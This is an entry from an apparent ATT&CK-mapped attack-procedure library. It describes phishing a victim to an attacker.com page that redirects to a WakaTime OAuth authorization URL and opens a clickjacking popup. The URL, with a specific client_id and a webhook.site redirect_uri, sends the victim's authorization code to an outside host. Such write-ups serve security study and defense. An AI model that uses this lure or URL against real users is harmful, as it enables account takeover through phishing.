---
id: proc-uuid-3
name: Lure Victim to Initial Webpage
tags:
  - phishing
  - lure
  - social-engineering
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:30:18.745Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Lure Victim to Initial Webpage

## Summary

This procedure involves distributing the malicious index.html link to the victim, triggering a redirect to the WakaTime OAuth page and opening the clickjacking popup tab.

## Description

The attacker uses social engineering (e.g., email, link sharing) to get the victim to visit https://attacker.com (hosted index.html). JavaScript in index.html performs window.location.href to the OAuth URL with embedded parameters and window.open to /attack, setting up the aligned buttons for the double-click exploit.

## Requirements

1. Hosted server from previous procedure
2. Method to distribute link (e.g., email, social media)
3. Victim with WakaTime account

## Defense

Defensive measures and detection strategies:

- Train users to verify links before clicking
- Use URL scanners in email gateways
- Monitor for unexpected redirects and popups

## Objectives

1. Direct victim to OAuth authorization
2. Open aligned popup without suspicion
3. Position for double-click interaction

## Instructions

### Step 1: Distribute Malicious Link

**Context**: Send the lure link to the victim.

No command; share http://attacker.com (or localhost:5000 for PoC) via phishing or direct message.

> Victim clicks and loads index.html.

### Step 2: Initiate Redirect and Popup

**Context**: Automatically trigger the OAuth flow and popup.

Handled by index.html JavaScript: redirect current tab to https://wakatime.com/oauth/authorize?client_id=joUNHCTnWqQ9hsmrWS5CTokR&response_type=code&redirect_uri=https://webhook.site/15495620-7c98-4643-a6df-9e7864c0dead&scope=read_orgs,write_orgs and open new tab to /attack.

> Expected: OAuth page loads; popup with 'Double Click' button appears.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[lure]]
- [[social-engineering]]
